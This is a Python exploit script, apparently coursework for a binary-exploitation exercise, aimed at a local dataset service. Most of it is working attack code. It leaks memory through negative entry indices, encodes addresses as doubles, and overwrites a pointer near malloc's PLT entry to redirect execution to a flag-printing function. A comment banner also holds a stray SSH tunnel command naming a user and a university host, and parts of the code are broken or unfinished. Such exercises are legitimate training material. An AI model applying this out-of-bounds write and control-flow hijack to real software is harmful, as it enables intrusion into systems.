#!/usr/bin/python3

import struct
import socket
import math

TARGET = ('localhost', 2000)

########################################################################
############################### Utilities ##############################
########################################################################
def interact(s):
	import telnetlib
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

def recv_until(string, s):
	buf = bytearray()
	string = string.encode('ASCII')
	
	while not string in buf:
		new = s.recv(1)
		if new == b"":
			raise ValueError("could not receive input")
		buf += new
#	print(buf)
	return buf.decode('ASCII')

def bytes_to_double(b):
	assert(len(b) == 8)
	return struct.unpack("d", b)[0]

def data_to_doubles(data):
	assert(len(data) % 8 == 0)
	return [bytes_to_double(data[i:i+8]) for i in range(0, len(data), 8)]

def extract_bytes_from_double_str(double_str):
	""" Reconstructs the bytes that constituted the double precision
		floating point number that is given in textual representation
		in <double_str>.
		
		Note that the representation might not be unique, e.g. for
		special values like NaN.
		This function therefore returns a tuple of two sequences.
		The first sequence contains the bytes as reconstructed,
		whereas the second contains information on whether the
		respective byte could be reconstructed: It contains a zero if
		the byte is not uniquely determined, and non-zero otherwise.
		
		<double_str> should contain _only_ a number, and nothing more.
		
		Assumes that the textual representation contains enough digits
		to completely determine a double value.
		
		Currently assumes little-endian byte order."""
	
	double = float(double_str)
	if double == 0.0:
		pattern = "\A\s*-"
		if re.match(pattern, double_str):
			# the double is negative zero
			return bytearray(b"\x00" * 7 + b"\x80"), [1] * 8
		else:
			return bytearray(b"\x00" * 8), [1] * 8
		
	elif math.isnan(double):
		
		# the exponent must be all one, but we don't know the highest bit :(
		return b"\x00" * 8, [0x0] * 8
	
	elif math.isinf(double):
		
		if double_str.find('-') != -1:
			return b"\x00" * 6 + b"\xF0\xFF", [1] * 8
		else:
			return b"\x00" * 6 + b"\xF0\x7F", [1] * 8
	else:
		
		assert(math.isfinite(double))
		data = struct.pack("d", double)
		# we ignore the least significant byte,
		# since it is sometimes wrong due to rounding.
		return data, [0] + [1] * 7


########################################################################
########################### Dataset Management #########################ssh -N -p 60008 -L localhost:5250:localhost:2002 mao@godzilla.ira.uka.de
########################################################################

def create_dataset(name, length, precision, s, values):
	s.send(b"A\n")
	recv_until("new dataset:\n", s)
	if isinstance(name, str):
		name = name.encode('ASCII')
	s.send(name + b"\n")
	recv_until("(the number of entries):\n", s)
	s.send(str(length).encode('ASCII') + b"\n")
	recv_until("after the decimal point):\n", s)
	s.send(str(precision).encode('ASCII') + b"\n")
	for v in values:
		s.send(str(v).encode('ASCII') + b"\n")
	recv_until("Your choice?\n> ", s)

def change_dataset(name, entry_number, value, s):
	""" changes the <entry_number>-th value in the dataset <name> to <value>.
	Returns the previous value as string, as delivered by the server.
	if recv_after_write == False, then this functions does not recv any data
	after the entry has been changed.
	"""
	
	s.send(b"C\n")
	recv_until("Which dataset?\n", s)
	s.send(name + b"\n")
	recv_until('Which entry would you like to change?\n', s)
	s.send(str(entry_number).encode('ASCII') + b"\n")
	
	# extract the old value
	recv_until('Okay. The current value is ', s)
	end = ". What is the correct value?\n"
	answer = recv_until(end, s)
	assert(answer.endswith(end))
	answer = answer[0:answer.index(end)]
	
	# set the new value
	s.send(str(value).encode('ASCII') + b"\n")
	
	return answer

def delete_dataset(name, s):
	s.send(b"D\n")
	recv_until("Which dataset do you want to delete?\n", s)
	s.send(name.encode('ASCII') + b"\n")
	recv_until("Your choice?\n> ", s)


########################################################################
############################ Your Code Here ############################
########################################################################

def exploit_dataset(name, entry_number, s):
	"""Use the edit_dataset function to get data stored at the entry_number-th 
	position, but does not change its origional value"""
	s.send(b"C\n")
	recv_until("Which dataset?\n", s)
	s.send(name + b"\n")
	recv_until('Which entry would you like to change?\n', s)
	s.send(str(entry_number).encode('ASCII') + b"\n")
	
	# extract the old value
	buf = s.recv(4096)
	words = buf.split()
#	print(words)
	ori_value = words[5]
	ori_value = ori_value[:len(ori_value) - 1]
#	print(ori_value)
	
	byte_recv,useless = extract_bytes_from_double_str(ori_value)
	address = hex(int.from_bytes(byte_recv, byteorder="little"))
	ori_value_in_double = bytes_to_double(byte_recv)

#	message_send(str(ori_value_in_double).encode('ASCII'),s)
#	show_recv(s)	
	s.send(str(ori_value_in_double).encode("ASCII"))
	s.send(b'\n')

	print(entry_number,' : ', ori_value ,' which is ', address)

def show_recv(s):
	buf = s.recv(1024)
	print(buf.decode())

def message_send(mes,s):
	s.send(mes)
	s.send(b'\n')
	print(mes,' sent.********')
	show_recv(s)

def address_to_double(target_address):
	target_bytes = int(str(target_address)).to_bytes(8,'little')
	target_double = bytes_to_double(target_bytes)
	return target_double

def attack(target):
	s = socket.create_connection(target)
	menu = s.recv(4096)
	print(menu.decode())
	
	name1 = b'set1'
	size1 = 5
	precision1 = 32
	elements1 = [2 , 4 , 8 , 16 , 32 ]
	create_dataset(name1 , size1 , precision1 , s , elements1)
	print("dataset ",name1," created")
	
#	message_send(b"L", s)
#	show_recv(s)

	exploit_dataset(name1 , -4 ,s)
	exploit_dataset(name1 , -4 ,s)
	
	malloc_plt = 0x6040a8
	double_malloc_plt = address_to_double(malloc_plt)
	print_flag = 0x401dcc
	double_print_flag = address_to_double(print_flag)

	change_dataset(name1, -4, double_malloc_plt, s)
	change_dataset(name1, 1 , double_print_flag, s)
	
	recv_until("Your choice?\n> ", s)
	message_send(b'A', s)
	message_send(b'set2', s)
	message_send(b'5', s)
	show_recv(s)
	show_recv(s)
	s.close()

if __name__ == "__main__":
	attack(TARGET)
	
	
"""Actually I don't know what are get_doubles_from() and read_data() functions used for in 
	the attack process. And I didn't implement them."""
def get_doubles_from(address, number, socket):
	""" Read `number` doubles from address `address`. """
	pass
	#TODO
#	raise NotImplementedError

def read_data(address, amount, s):
	""" Read <amount> bytes from address <address>."""
	pass
	#TODO: somehow use get_doubles_from and extract_bytes_from_double_str
#	raise NotImplementedError

def write_data(name, data, entry_number, s):
	""" Write given data to the given address. """
	s.send(b'C\n')
	recv_until("Which dataset?\n", s)
	s.send(name + b"\n")
	recv_until('Which entry would you like to change?\n', s)
	s.send(str(entry_number).encode('ASCII') + b"\n")
	recv_until('Which entry would you like to change?\n', s)
      

